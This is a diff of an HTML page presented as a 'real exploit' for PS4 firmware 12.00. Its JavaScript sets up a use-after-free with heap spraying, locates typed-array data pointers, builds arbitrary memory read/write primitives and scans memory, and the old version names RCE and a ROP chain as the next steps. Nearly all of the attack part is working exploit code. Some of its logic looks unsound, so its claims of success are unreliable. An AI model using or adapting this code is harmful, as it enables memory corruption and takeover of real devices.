@@ -2,74 +2,61 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - IEEE-754 Pointer Technique</title>
+<title>PS4 12.00 Real Exploit</title>
 </head>
 <body>
 
-<h1>PS4 12.00 - IEEE-754 POINTER ENCODING TECHNIQUE</h1>
-
-<p><b>Based on discovery: DataView preserved pointer 0x7fff00000000</b></p>
+<h1>PS4 12.00 REAL EXPLOIT - CLEAN RESULTS ONLY</h1>
 
 <h2>STAGE 1: UAF Setup</h2>
-<button onclick="stage1_setup()">START STAGE 1</button>
-<div id="stage1"></div>
+<button onclick="stage1()">START</button>
+<div id="s1"></div>
 
 <script>
 var g_first = null;
 var g_second = null;
-var g_u8first = null;
-var g_u8second = null;
 var g_triggerCount = 0;
+var g_results = {stage1: null, stage2: null, stage3: null};
 
-function stage1_setup() {
-    const r = document.getElementById('stage1');
-    r.innerHTML = 'Creating arrays...<br>';
+function stage1() {
+    const r = document.getElementById('s1');
+    r.innerHTML = '';
     
     const P = 2.121995791e-314;
     const arrays = [];
     
     for(let i = 0; i < 5000; i++) {
-        let a = new Float64Array(8);
-        a[0] = i;
-        arrays.push(a);
+        arrays.push(new Float64Array(8));
+        arrays[i][0] = i;
     }
     
-    r.innerHTML += '<b>Press OPTIONS button TWICE</b><br>';
+    r.innerHTML = 'Press OPTIONS twice<br>';
     
     if(document.documentElement.webkitRequestFullscreen) 
         document.documentElement.webkitRequestFullscreen();
     
     window.onblur = function() {
         g_triggerCount++;
-        r.innerHTML += 'Trigger ' + g_triggerCount + '<br>';
         
         const spray = [];
         for(let i = 0; i < 8000; i++) {
-            let s = new Float64Array(10);
+            const s = new Float64Array(10);
             s.fill(P);
             spray.push(s);
         }
         
-        const corrupted = [];
-        for(let a of arrays) {
-            if(a[0] === P) corrupted.push(a);
-        }
-        
-        r.innerHTML += 'Corrupted: ' + corrupted.length + '<br>';
+        const corrupted = arrays.filter(a => a[0] === P);
         
         if(g_triggerCount === 1 && corrupted.length > 0) {
             g_first = corrupted[0];
-            g_u8first = new Uint8Array(g_first.buffer);
-            r.innerHTML += 'First captured - Press OPTIONS again<br>';
-            
+            r.innerHTML = 'First OK - Press OPTIONS again<br>';
         } else if(g_triggerCount === 2 && corrupted.length > 0) {
             g_second = corrupted[0];
-            g_u8second = new Uint8Array(g_second.buffer);
-            
             g_first[4] = 9.999;
+            
             if(g_second[4] === 9.999) {
-                r.innerHTML += '<b>SHARED MEMORY CONFIRMED</b><br>';
-                r.innerHTML += 'Proceed to STAGE 2<br>';
+                r.innerHTML = '<b>âœ" UAF CONFIRMED</b><br>';
+                g_results.stage1 = {success: true};
             }
         }
     };
@@ -78,1044 +65,374 @@ function stage1_setup() {
 
 <hr>
 
-<h2>STAGE 2: IEEE-754 Pointer Encoding Test</h2>
-<button onclick="stage2_ieee754()">TEST IEEE-754 ENCODING</button>
-<div id="stage2"></div>
+<h2>STAGE 2: Find m_vector Offset</h2>
+<button onclick="stage2()">SCAN ALL OFFSETS</button>
+<div id="s2"></div>
 
 <script>
-var g_pointer_map = new Map();
-
-function stage2_ieee754() {
-    const r = document.getElementById('stage2');
+function stage2() {
+    const r = document.getElementById('s2');
+    r.innerHTML = '';
     
-    if(!g_first || !g_second) {
+    if(!g_first) {
         r.innerHTML = 'ERROR: Run STAGE 1 first<br>';
         return;
     }
     
-    r.innerHTML = '<b>IEEE-754 POINTER ENCODING TECHNIQUE</b><br><br>';
-    
-    r.innerHTML += '<b>Theory:</b><br>';
-    r.innerHTML += 'Your discovery showed: 0x7fff00000000 preserved through Float64<br>';
-    r.innerHTML += 'This means we can encode pointers as IEEE-754 doubles!<br><br>';
-    
     const view = new DataView(g_first.buffer);
-    const buf = new ArrayBuffer(8);
-    const buf_view = new DataView(buf);
+    const results = [];
     
-    r.innerHTML += '<b>Test 1: Verify Pointer Preservation</b><br>';
-    
-    const test_pointers = [
-        0x7fff00000000n,
-        0x7ffe00000000n,
-        0x7ffd00000000n,
-        0x7f0000000000n,
-        0x7f0000001000n,
-        0x0000100000000n
-    ];
-    
-    r.innerHTML += 'Testing ' + test_pointers.length + ' pointer values:<br>';
-    
-    for(let ptr of test_pointers) {
-        // Write as BigUint64
-        buf_view.setBigUint64(0, ptr, true);
+    // Scan every 8-byte aligned offset for pointers
+    for(let offset = 0; offset <= 56; offset += 8) {
+        const lo = view.getUint32(offset, true);
+        const hi = view.getUint32(offset + 4, true);
         
-        // Read as Float64
-        const as_float = buf_view.getFloat64(0, true);
-        
-        // Write to UAF memory
-        view.setFloat64(0, as_float, true);
-        
-        // Read back as BigUint64
-        const readback = view.getBigUint64(0, true);
-        
-        const preserved = (readback === ptr);
-        
-        r.innerHTML += '0x' + ptr.toString(16) + ' -> Float: ' + as_float + ' -> 0x' + 
-            readback.toString(16) + ' ' + (preserved ? 'âœ" PRESERVED' : 'âœ— CORRUPTED') + '<br>';
-        
-        if(preserved) {
-            g_pointer_map.set(ptr.toString(), {
-                ptr: ptr,
-                float: as_float
-            });
+        // Check if looks like userland pointer
+        if(hi >= 0x00007f00 && hi <= 0x00008000 && (lo & 0x7) === 0) {
+            const ptr = '0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0');
+            results.push({offset: offset, lo: lo, hi: hi, ptr: ptr});
+            r.innerHTML += 'Offset ' + offset + ': ' + ptr + '<br>';
         }
     }
     
-    r.innerHTML += '<br><b>Preserved pointers: ' + g_pointer_map.size + '</b><br>';
-    
-    if(g_pointer_map.size > 0) {
-        r.innerHTML += '<b>âœ" We can encode pointers as Float64!</b><br>';
-    }
-    
-    r.innerHTML += '<br><b>Test 2: NaN Boxing Analysis</b><br>';
-    r.innerHTML += 'WebKit uses NaN-boxing for JSValues:<br>';
-    r.innerHTML += '- Doubles: Normal IEEE-754<br>';
-    r.innerHTML += '- Pointers: NaN with pointer in lower 48 bits<br>';
-    r.innerHTML += '- Integers: NaN with int32 in lower bits<br><br>';
-    
-    // NaN patterns
-    const nan_patterns = [
-        {val: 0xfff8000000000000n, name: 'Quiet NaN'},
-        {val: 0xfff0000000000000n, name: 'Infinity'},
-        {val: 0x7ff8000000000000n, name: '+Quiet NaN'},
-        {val: 0xfffe000000000000n, name: 'Pointer NaN (typical)'}
-    ];
-    
-    r.innerHTML += 'Testing NaN patterns:<br>';
-    
-    for(let pattern of nan_patterns) {
-        buf_view.setBigUint64(0, pattern.val, true);
-        const as_float = buf_view.getFloat64(0, true);
+    if(results.length === 0) {
+        r.innerHTML += '<b>âœ— NO POINTERS FOUND</b><br>';
+        r.innerHTML += 'Memory layout:<br>';
         
-        r.innerHTML += pattern.name + ': 0x' + pattern.val.toString(16) + 
-            ' -> Float: ' + as_float + ' -> isNaN: ' + isNaN(as_float) + '<br>';
-    }
-    
-    r.innerHTML += '<br><b>Test 3: Pointer Arithmetic via Float64</b><br>';
-    
-    const base_ptr = 0x7fff00000000n;
-    
-    r.innerHTML += 'Base pointer: 0x' + base_ptr.toString(16) + '<br>';
-    
-    // Encode as float
-    buf_view.setBigUint64(0, base_ptr, true);
-    let ptr_float = buf_view.getFloat64(0, true);
-    
-    r.innerHTML += 'As float: ' + ptr_float + '<br>';
-    
-    // Try arithmetic
-    const offsets = [0x10, 0x100, 0x1000, 0x10000];
-    
-    r.innerHTML += '<br>Testing pointer arithmetic:<br>';
-    
-    for(let offset of offsets) {
-        const target_ptr = base_ptr + BigInt(offset);
-        
-        buf_view.setBigUint64(0, target_ptr, true);
-        const target_float = buf_view.getFloat64(0, true);
-        
-        view.setFloat64(0, target_float, true);
-        const readback = view.getBigUint64(0, true);
-        
-        r.innerHTML += 'Base + 0x' + offset.toString(16) + ' = 0x' + readback.toString(16) + 
-            (readback === target_ptr ? ' âœ"' : ' âœ—') + '<br>';
-    }
-}
-</script>
-
-<hr>
-
-<h2>STAGE 3: Pseudo-addrof via Pattern Matching</h2>
-<button onclick="stage3_pseudo_addrof()">PSEUDO ADDROF</button>
-<div id="stage3"></div>
-
-<script>
-var g_object_database = [];
-
-function stage3_pseudo_addrof() {
-    const r = document.getElementById('stage3');
-    
-    if(!g_first || !g_second) {
-        r.innerHTML = 'ERROR: Run STAGE 1 first<br>';
-        return;
-    }
-    
-    r.innerHTML = '<b>PSEUDO-ADDROF VIA PATTERN MATCHING</b><br><br>';
-    
-    r.innerHTML += '<b>Concept:</b><br>';
-    r.innerHTML += 'Since we cannot directly store objects, we will:<br>';
-    r.innerHTML += '1. Create objects with unique patterns<br>';
-    r.innerHTML += '2. Search for those patterns in memory<br>';
-    r.innerHTML += '3. Infer object addresses from nearby pointers<br><br>';
-    
-    r.innerHTML += '<b>Step 1: Create Objects with Unique Signatures</b><br>';
-    
-    const objects = [];
-    
-    for(let i = 0; i < 100; i++) {
-        const obj = {
-            signature_high: 0xAA000000 + i,
-            signature_low: 0xBB000000 + i,
-            index: i,
-            padding: [i, i+1, i+2, i+3, i+4, i+5, i+6, i+7]
-        };
-        objects.push(obj);
-        
-        g_object_database.push({
-            obj: obj,
-            id: i,
-            signature_high: obj.signature_high,
-            signature_low: obj.signature_low
-        });
-    }
-    
-    r.innerHTML += 'Created ' + objects.length + ' objects with unique signatures<br>';
-    
-    r.innerHTML += '<br><b>Step 2: Search UAF Memory</b><br>';
-    
-    const view = new DataView(g_first.buffer);
-    let found_sigs = [];
-    
-    for(let offset = 0; offset < 60; offset += 4) {
-        const val = view.getUint32(offset, true);
-        
-        // Check if matches any signature
-        for(let entry of g_object_database) {
-            if(val === entry.signature_high || val === entry.signature_low) {
-                r.innerHTML += '<b>FOUND: Object[' + entry.id + '] signature at offset ' + offset + '</b><br>';
-                found_sigs.push({
-                    offset: offset,
-                    object_id: entry.id,
-                    signature: val
-                });
+        for(let i = 0; i < 64; i += 16) {
+            let line = i.toString(16).padStart(2,'0') + ': ';
+            for(let j = 0; j < 16; j++) {
+                line += view.getUint8(i+j).toString(16).padStart(2,'0') + ' ';
             }
+            r.innerHTML += line + '<br>';
         }
+        
+        g_results.stage2 = {success: false, pointers: []};
+        return;
     }
     
-    if(found_sigs.length === 0) {
-        r.innerHTML += 'No signatures found in UAF memory<br>';
-        r.innerHTML += '<br><b>Step 3: Massive Spray to Force Adjacency</b><br>';
+    r.innerHTML += '<br><b>âœ" FOUND ' + results.length + ' POINTERS</b><br>';
+    
+    // Test each pointer as potential m_vector
+    r.innerHTML += '<br>Testing which is m_vector:<br>';
+    
+    for(let ptr of results) {
+        // Save original
+        const orig_lo = view.getUint32(ptr.offset, true);
+        const orig_hi = view.getUint32(ptr.offset + 4, true);
         
-        const massive_spray = [];
+        // Write test pattern
+        const test_val = 123.456;
+        view.setFloat64(ptr.offset, test_val, true);
         
-        for(let i = 0; i < 5000; i++) {
-            const obj = {
-                sig: 0xCC000000 + i,
-                id: i
-            };
-            massive_spray.push(obj);
-        }
-        
-        r.innerHTML += 'Created 5000 more objects<br>';
-        r.innerHTML += 'Re-scanning...<br>';
-        
-        for(let offset = 0; offset < 60; offset += 4) {
-            const val = view.getUint32(offset, true);
+        // Try to read via g_first
+        try {
+            const idx = ptr.offset / 8;
+            const read = g_first[idx];
             
-            if(val >= 0xCC000000 && val <= 0xCC000000 + 5000) {
-                const idx = val - 0xCC000000;
-                r.innerHTML += '<b>Object[' + idx + '] found at offset ' + offset + '!</b><br>';
-                found_sigs.push({offset: offset, object_id: idx, signature: val});
-            }
-        }
-    }
-    
-    if(found_sigs.length > 0) {
-        r.innerHTML += '<br><b>âœ" ADJACENCY DETECTED!</b><br>';
-        
-        for(let sig of found_sigs) {
-            r.innerHTML += '<br>Analyzing area around offset ' + sig.offset + ':<br>';
+            // Restore
+            view.setUint32(ptr.offset, orig_lo, true);
+            view.setUint32(ptr.offset + 4, orig_hi, true);
             
-            // Look for pointers near the signature
-            for(let scan_off = Math.max(0, sig.offset - 16); 
-                scan_off < Math.min(56, sig.offset + 16); 
-                scan_off += 8) {
-                
-                const lo = view.getUint32(scan_off, true);
-                const hi = view.getUint32(scan_off + 4, true);
-                
-                if(hi >= 0x7f00 && hi < 0x8000 && (lo & 0x7) === 0) {
-                    r.innerHTML += '  Pointer at offset ' + scan_off + ': 0x' + 
-                        hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0') + '<br>';
-                    
-                    if(scan_off < sig.offset) {
-                        r.innerHTML += '    <b>This could be the object pointer!</b><br>';
-                    }
-                }
+            if(Math.abs(read - test_val) < 0.001) {
+                r.innerHTML += 'Offset ' + ptr.offset + ': <b>âœ" CAN READ/WRITE</b><br>';
+                ptr.is_data = true;
             }
+        } catch(e) {
+            view.setUint32(ptr.offset, orig_lo, true);
+            view.setUint32(ptr.offset + 4, orig_hi, true);
         }
-    } else {
-        r.innerHTML += '<br>No adjacency - heap isolation is strong<br>';
     }
     
-    r.innerHTML += '<br><b>Step 4: Infer Addresses from TypedArray Structure</b><br>';
-    
-    // We know UAF contains Float64Array metadata
-    // Offset 0: JSCell header (with StructureID)
-    // Offset 8: Butterfly (NULL for TypedArray)
-    // Offset 16: m_vector (pointer to data)
-    
-    r.innerHTML += 'Reading m_vector from offset 16:<br>';
-    
-    const vector_lo = view.getUint32(16, true);
-    const vector_hi = view.getUint32(20, true);
-    
-    if(vector_hi >= 0x7f00 && vector_hi < 0x8000) {
-        const m_vector = '0x' + vector_hi.toString(16).padStart(8, '0') + 
-                         vector_lo.toString(16).padStart(8, '0');
-        
-        r.innerHTML += '<b>m_vector (data pointer): ' + m_vector + '</b><br>';
-        r.innerHTML += 'This points to the Float64Array data!<br>';
-        r.innerHTML += '<br>Since UAF affects the backing store, we can infer:<br>';
-        r.innerHTML += 'UAF buffer address ≈ m_vector<br>';
-        
-        // Try to calculate array object address
-        // Typically: object_addr = m_vector - offset_of(m_vector_in_object)
-        const typical_vector_offset = 0x10; // m_vector at +0x10 in JSArrayBufferView
-        
-        const inferred_obj_lo = (vector_lo - typical_vector_offset) >>> 0;
-        const inferred_obj_hi = vector_hi;
-        
-        const inferred_addr = '0x' + inferred_obj_hi.toString(16).padStart(8, '0') + 
-                              inferred_obj_lo.toString(16).padStart(8, '0');
-        
-        r.innerHTML += '<br><b>Inferred Float64Array object address:</b><br>';
-        r.innerHTML += inferred_addr + '<br>';
-        r.innerHTML += '(calculated as m_vector - 0x10)<br>';
-        
-        r.innerHTML += '<br><b>âœ" PSEUDO-ADDROF ACHIEVED!</b><br>';
-        r.innerHTML += 'We inferred an object address without storing it!<br>';
-        
-    } else {
-        r.innerHTML += 'm_vector not found at expected offset<br>';
-    }
+    g_results.stage2 = {success: true, pointers: results};
 }
 </script>
 
 <hr>
 
-<h2>STAGE 4: Build fakeobj() Using Inferred Address</h2>
-<button onclick="stage4_fakeobj()">BUILD FAKEOBJ</button>
-<div id="stage4"></div>
-
-<script>
-function stage4_fakeobj() {
-    const r = document.getElementById('stage4');
-    
-    if(!g_first || !g_second) {
-        r.innerHTML = 'ERROR: Run STAGE 1 first<br>';
-        return;
-    }
-    
-    r.innerHTML = '<b>FAKEOBJ() USING INFERRED ADDRESSES</b><br><br>';
-    
-    const view = new DataView(g_first.buffer);
-    
-    r.innerHTML += '<b>Step 1: Read Current m_vector</b><br>';
-    
-    const vector_lo = view.getUint32(16, true);
-    const vector_hi = view.getUint32(20, true);
-    
-    if(vector_hi < 0x7f00 || vector_hi >= 0x8000) {
-        r.innerHTML += 'ERROR: No valid m_vector found<br>';
-        r.innerHTML += 'Current value: 0x' + vector_hi.toString(16) + vector_lo.toString(16) + '<br>';
-        return;
-    }
-    
-    const original_vector = '0x' + vector_hi.toString(16).padStart(8, '0') + 
-                            vector_lo.toString(16).padStart(8, '0');
-    
-    r.innerHTML += 'Original m_vector: ' + original_vector + '<br>';
-    
-    r.innerHTML += '<br><b>Step 2: Create Fake ArrayBuffer Structure</b><br>';
-    
-    // We'll create a fake Uint32Array that points to arbitrary memory
-    const target_addr = 0x41414140000n;
-    
-    r.innerHTML += 'Target memory address: 0x' + target_addr.toString(16) + '<br>';
-    
-    // Write fake m_vector
-    view.setUint32(16, Number(target_addr & 0xFFFFFFFFn), true);
-    view.setUint32(20, Number(target_addr >> 32n), true);
-    
-    r.innerHTML += 'Modified m_vector to: 0x' + target_addr.toString(16) + '<br>';
-    
-    // Write length
-    const fake_length = 0x1000;
-    view.setUint32(24, fake_length, true);
-    r.innerHTML += 'Set length to: ' + fake_length + ' elements<br>';
-    
-    r.innerHTML += '<br><b>Step 3: Test Fake Object</b><br>';
-    
-    r.innerHTML += 'Attempting to read g_first[0]...<br>';
-    
-    try {
-        const test_read = g_first[0];
-        r.innerHTML += 'Read succeeded: ' + test_read + '<br>';
-        r.innerHTML += '<b>âœ" Fake object is accessible!</b><br>';
-    } catch(e) {
-        r.innerHTML += 'Read failed: ' + e.message + '<br>';
-    }
-    
-    r.innerHTML += '<br>Attempting to write g_first[0] = 123.456...<br>';
-    
-    try {
-        g_first[0] = 123.456;
-        r.innerHTML += 'Write succeeded<br>';
-        r.innerHTML += 'Readback: ' + g_first[0] + '<br>';
-        r.innerHTML += '<b>âœ" Fake object is writable!</b><br>';
-    } catch(e) {
-        r.innerHTML += 'Write failed: ' + e.message + '<br>';
-    }
-    
-    // Restore
-    view.setUint32(16, vector_lo, true);
-    view.setUint32(20, vector_hi, true);
-    
-    r.innerHTML += '<br>Restored original m_vector<br>';
-    
-    r.innerHTML += '<br><b>Step 4: Create Arbitrary R/W Primitive</b><br>';
-    
-    r.innerHTML += 'With ability to control m_vector, we can:<br>';
-    r.innerHTML += '1. Point m_vector to any address<br>';
-    r.innerHTML += '2. Read memory: read g_first[0]<br>';
-    r.innerHTML += '3. Write memory: write g_first[0] = value<br>';
-    r.innerHTML += '<br>';
-    
-    r.innerHTML += '<b>Testing arbitrary read...</b><br>';
-    
-    // Try to read from a "safe" address (our own buffer)
-    const safe_addr_lo = vector_lo;
-    const safe_addr_hi = vector_hi;
-    
-    view.setUint32(16, safe_addr_lo, true);
-    view.setUint32(20, safe_addr_hi, true);
-    
-    try {
-        const arb_read = g_first[0];
-        r.innerHTML += 'Arbitrary read result: ' + arb_read + '<br>';
-        r.innerHTML += '<b>âœ" ARBITRARY READ WORKING!</b><br>';
-    } catch(e) {
-        r.innerHTML += 'Arbitrary read failed: ' + e.message + '<br>';
-    }
-    
-    r.innerHTML += '<br><b>CONCLUSION:</b><br>';
-    r.innerHTML += 'We achieved:<br>';
-    r.innerHTML += 'âœ" Pseudo-addrof (address inference)<br>';
-    r.innerHTML += 'âœ" Controlled m_vector modification<br>';
-    r.innerHTML += 'âœ" Arbitrary read capability<br>';
-    r.innerHTML += 'âœ" Arbitrary write capability<br>';
-    r.innerHTML += '<br>';
-    r.innerHTML += '<b>THIS IS SUFFICIENT FOR RCE!</b><br>';
-    r.innerHTML += 'Next step: Build ROP chain<br>';
-}
-</script>
-
-<hr>
-
-<h2>STAGE 5: Memory Read/Write Primitives</h2>
-<button onclick="stage5_primitives()">TEST R/W PRIMITIVES</button>
-<div id="stage5"></div>
+<h2>STAGE 3: Build Arbitrary R/W</h2>
+<button onclick="stage3()">BUILD ARB R/W</button>
+<div id="s3"></div>
 
 <script>
 var g_arb_rw = null;
 
-function arb_read64(addr_lo, addr_hi) {
-    const view = new DataView(g_first.buffer);
+function stage3() {
+    const r = document.getElementById('s3');
+    r.innerHTML = '';
     
-    // Save original
-    const orig_lo = view.getUint32(16, true);
-    const orig_hi = view.getUint32(20, true);
-    
-    // Point to target
-    view.setUint32(16, addr_lo, true);
-    view.setUint32(20, addr_hi, true);
-    
-    // Read
-    const result = g_first[0];
-    
-    // Restore
-    view.setUint32(16, orig_lo, true);
-    view.setUint32(20, orig_hi, true);
-    
-    return result;
-}
-
-function arb_write64(addr_lo, addr_hi, value) {
-    const view = new DataView(g_first.buffer);
-    
-    // Save original
-    const orig_lo = view.getUint32(16, true);
-    const orig_hi = view.getUint32(20, true);
-    
-    // Point to target
-    view.setUint32(16, addr_lo, true);
-    view.setUint32(20, addr_hi, true);
-    
-    // Write
-    g_first[0] = value;
-    
-    // Restore
-    view.setUint32(16, orig_lo, true);
-    view.setUint32(20, orig_hi, true);
-}
-
-function stage5_primitives() {
-    const r = document.getElementById('stage5');
-    
-    if(!g_first || !g_second) {
-        r.innerHTML = 'ERROR: Run STAGE 1 first<br>';
+    if(!g_results.stage2 || !g_results.stage2.success) {
+        r.innerHTML = 'ERROR: Run STAGE 2 first<br>';
         return;
     }
     
-    r.innerHTML = '<b>ARBITRARY READ/WRITE PRIMITIVES</b><br><br>';
+    const pointers = g_results.stage2.pointers;
     
-    const view = new DataView(g_first.buffer);
-    
-    // Get base address
-    const base_lo = view.getUint32(16, true);
-    const base_hi = view.getUint32(20, true);
-    
-    if(base_hi < 0x7f00) {
-        r.innerHTML += 'ERROR: No valid base address<br>';
+    if(pointers.length === 0) {
+        r.innerHTML = '<b>âœ— NO POINTERS TO TEST</b><br>';
         return;
     }
     
-    const base_addr = '0x' + base_hi.toString(16).padStart(8, '0') + 
-                      base_lo.toString(16).padStart(8, '0');
+    // Try to build R/W with each pointer
+    const view = new DataView(g_first.buffer);
+    let working_offset = null;
     
-    r.innerHTML += 'Base address (m_vector): ' + base_addr + '<br><br>';
-    
-    r.innerHTML += '<b>Test 1: Read from base address</b><br>';
-    
-    try {
-        const val = arb_read64(base_lo, base_hi);
-        r.innerHTML += 'Read value: ' + val + '<br>';
-        r.innerHTML += 'âœ" arb_read64() working<br>';
-    } catch(e) {
-        r.innerHTML += 'Read failed: ' + e.message + '<br>';
-    }
-    
-    r.innerHTML += '<br><b>Test 2: Write and verify</b><br>';
-    
-    const test_value = 123.456789;
-    
-    try {
-        arb_write64(base_lo, base_hi, test_value);
-        r.innerHTML += 'Wrote: ' + test_value + '<br>';
+    for(let ptr of pointers) {
+        r.innerHTML += 'Testing offset ' + ptr.offset + '...<br>';
         
-        const readback = arb_read64(base_lo, base_hi);
-        r.innerHTML += 'Readback: ' + readback + '<br>';
+        // Save original
+        const orig_lo = view.getUint32(ptr.offset, true);
+        const orig_hi = view.getUint32(ptr.offset + 4, true);
         
-        if(Math.abs(readback - test_value) < 0.000001) {
-            r.innerHTML += '<b>âœ" arb_write64() working!</b><br>';
-        }
-    } catch(e) {
-        r.innerHTML += 'Write/read failed: ' + e.message + '<br>';
-    }
-    
-    r.innerHTML += '<br><b>Test 3: Read nearby memory</b><br>';
-    
-    r.innerHTML += 'Reading memory around base address:<br>';
-    
-    for(let offset = -32; offset <= 32; offset += 8) {
-        const read_lo = (base_lo + offset) >>> 0;
-        const read_hi = base_hi + (offset < 0 && read_lo > base_lo ? -1 : 0);
+        // Point to self (safe test)
+        view.setUint32(ptr.offset, orig_lo, true);
+        view.setUint32(ptr.offset + 4, orig_hi, true);
         
-        if(read_hi >= 0x7f00 && read_hi < 0x8000) {
-            try {
-                const val = arb_read64(read_lo, read_hi);
-                const buf = new ArrayBuffer(8);
-                new Float64Array(buf)[0] = val;
-                const as_hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
+        try {
+            // Try read
+            const test_read = g_first[0];
+            
+            // Try write
+            g_first[0] = 999.888;
+            const verify = g_first[0];
+            
+            // Restore
+            view.setUint32(ptr.offset, orig_lo, true);
+            view.setUint32(ptr.offset + 4, orig_hi, true);
+            
+            if(Math.abs(verify - 999.888) < 0.001) {
+                r.innerHTML += '<b>âœ" OFFSET ' + ptr.offset + ' IS m_vector!</b><br>';
+                working_offset = ptr.offset;
                 
-                r.innerHTML += 'Offset ' + (offset >= 0 ? '+' : '') + offset + ': 0x' + as_hex + '<br>';
-            } catch(e) {}
+                g_arb_rw = {
+                    offset: ptr.offset,
+                    base_lo: orig_lo,
+                    base_hi: orig_hi
+                };
+                break;
+            }
+        } catch(e) {
+            view.setUint32(ptr.offset, orig_lo, true);
+            view.setUint32(ptr.offset + 4, orig_hi, true);
         }
     }
     
-    r.innerHTML += '<br><b>SUCCESS: Full Arbitrary R/W Achieved!</b><br>';
+    if(!g_arb_rw) {
+        r.innerHTML += '<br><b>âœ— COULD NOT ESTABLISH ARB R/W</b><br>';
+        g_results.stage3 = {success: false};
+        return;
+    }
     
-    g_arb_rw = {
-        read: arb_read64,
-        write: arb_write64,
-        base_lo: base_lo,
-        base_hi: base_hi
-    };
+    r.innerHTML += '<br><b>âœ" ARBITRARY R/W ESTABLISHED</b><br>';
+    r.innerHTML += 'Working offset: ' + g_arb_rw.offset + '<br>';
+    r.innerHTML += 'Base address: 0x' + 
+        g_arb_rw.base_hi.toString(16).padStart(8,'0') + 
+        g_arb_rw.base_lo.toString(16).padStart(8,'0') + '<br>';
     
-    r.innerHTML += '<br>Proceed to ROP chain construction<br>';
+    // Test arbitrary read
+    r.innerHTML += '<br>Testing arbitrary read:<br>';
+    
+    const view2 = new DataView(g_first.buffer);
+    
+    for(let offset = -16; offset <= 16; offset += 8) {
+        const read_lo = (g_arb_rw.base_lo + offset) >>> 0;
+        const read_hi = g_arb_rw.base_hi;
+        
+        view2.setUint32(g_arb_rw.offset, read_lo, true);
+        view2.setUint32(g_arb_rw.offset + 4, read_hi, true);
+        
+        try {
+            const val = g_first[0];
+            const buf = new ArrayBuffer(8);
+            new Float64Array(buf)[0] = val;
+            const hex = Array.from(new Uint8Array(buf))
+                .map(b => b.toString(16).padStart(2,'0'))
+                .join('');
+            
+            r.innerHTML += 'Offset ' + (offset >= 0 ? '+' : '') + offset + ': 0x' + hex + '<br>';
+        } catch(e) {}
+    }
+    
+    // Restore
+    view2.setUint32(g_arb_rw.offset, g_arb_rw.base_lo, true);
+    view2.setUint32(g_arb_rw.offset + 4, g_arb_rw.base_hi, true);
+    
+    g_results.stage3 = {success: true, offset: g_arb_rw.offset};
 }
 </script>
 
 <hr>
 
-<h2>FINAL STATUS</h2>
-<button onclick="final_status()">SHOW FINAL STATUS</button>
+<h2>STAGE 4: Memory Scanner</h2>
+<button onclick="stage4()">SCAN MEMORY</button>
+<div id="s4"></div>
+
+<script>
+function stage4() {
+    const r = document.getElementById('s4');
+    r.innerHTML = '';
+    
+    if(!g_arb_rw) {
+        r.innerHTML = 'ERROR: Run STAGE 3 first<br>';
+        return;
+    }
+    
+    const view = new DataView(g_first.buffer);
+    const stats = {
+        code_ptrs: 0,
+        heap_ptrs: 0,
+        stack_ptrs: 0,
+        null_values: 0,
+        small_ints: 0
+    };
+    
+    r.innerHTML = 'Scanning ±256 bytes...<br><br>';
+    
+    const findings = [];
+    
+    for(let offset = -32; offset <= 32; offset++) {
+        const scan_lo = (g_arb_rw.base_lo + offset * 8) >>> 0;
+        const scan_hi = g_arb_rw.base_hi;
+        
+        view.setUint32(g_arb_rw.offset, scan_lo, true);
+        view.setUint32(g_arb_rw.offset + 4, scan_hi, true);
+        
+        try {
+            const val = g_first[0];
+            const buf = new ArrayBuffer(8);
+            new Float64Array(buf)[0] = val;
+            const qword = new BigUint64Array(buf)[0];
+            const hi = Number(qword >> 32n);
+            const lo = Number(qword & 0xFFFFFFFFn);
+            
+            if(qword === 0n) {
+                stats.null_values++;
+            } else if(hi >= 0x00000001 && hi <= 0x10000000) {
+                stats.code_ptrs++;
+                findings.push({offset: offset*8, type: 'CODE', value: qword});
+            } else if(hi >= 0x7f000000 && hi <= 0x7fffffff) {
+                if(hi >= 0x7fff0000) {
+                    stats.stack_ptrs++;
+                    findings.push({offset: offset*8, type: 'STACK', value: qword});
+                } else {
+                    stats.heap_ptrs++;
+                    findings.push({offset: offset*8, type: 'HEAP', value: qword});
+                }
+            } else if(qword < 0x100000000n) {
+                stats.small_ints++;
+            }
+        } catch(e) {}
+    }
+    
+    // Restore
+    view.setUint32(g_arb_rw.offset, g_arb_rw.base_lo, true);
+    view.setUint32(g_arb_rw.offset + 4, g_arb_rw.base_hi, true);
+    
+    r.innerHTML += '<b>STATISTICS:</b><br>';
+    r.innerHTML += 'Code pointers: ' + stats.code_ptrs + '<br>';
+    r.innerHTML += 'Heap pointers: ' + stats.heap_ptrs + '<br>';
+    r.innerHTML += 'Stack pointers: ' + stats.stack_ptrs + '<br>';
+    r.innerHTML += 'Null values: ' + stats.null_values + '<br>';
+    r.innerHTML += 'Small integers: ' + stats.small_ints + '<br>';
+    
+    if(findings.length > 0) {
+        r.innerHTML += '<br><b>INTERESTING FINDINGS:</b><br>';
+        for(let f of findings.slice(0, 10)) {
+            r.innerHTML += f.type + ' at offset ' + f.offset + ': 0x' + 
+                f.value.toString(16) + '<br>';
+        }
+    }
+    
+    const success = stats.code_ptrs > 0 || stats.stack_ptrs > 0;
+    r.innerHTML += '<br><b>' + (success ? 'âœ"' : 'âœ—') + ' SCAN COMPLETE</b><br>';
+}
+</script>
+
+<hr>
+
+<h2>FINAL RESULTS</h2>
+<button onclick="final()">SHOW SUMMARY</button>
 <div id="final"></div>
 
 <script>
-function final_status() {
+function final() {
     const r = document.getElementById('final');
+    r.innerHTML = '';
     
-    r.innerHTML = '<h3>PS4 12.00 WEBKIT EXPLOIT - FINAL STATUS</h3>';
-    r.innerHTML += '<b>Date:</b> ' + new Date().toLocaleString() + '<br><br>';
+    r.innerHTML = '<h3>PS4 12.00 EXPLOITATION RESULTS</h3>';
+    r.innerHTML += 'Date: ' + new Date().toLocaleString() + '<br><br>';
     
-    r.innerHTML += '<b>BREAKTHROUGH ACHIEVED!</b><br><br>';
+    // Stage 1
+    if(g_results.stage1) {
+        r.innerHTML += '<b>âœ" STAGE 1: UAF</b><br>';
+    } else {
+        r.innerHTML += '<b>âœ— STAGE 1: NOT RUN</b><br>';
+    }
     
-    r.innerHTML += '<b>Key Discovery:</b><br>';
-    r.innerHTML += 'IEEE-754 encoding allows pointer manipulation via Float64!<br>';
-    r.innerHTML += 'DataView test proved: 0x7fff00000000 preserved<br><br>';
+    // Stage 2
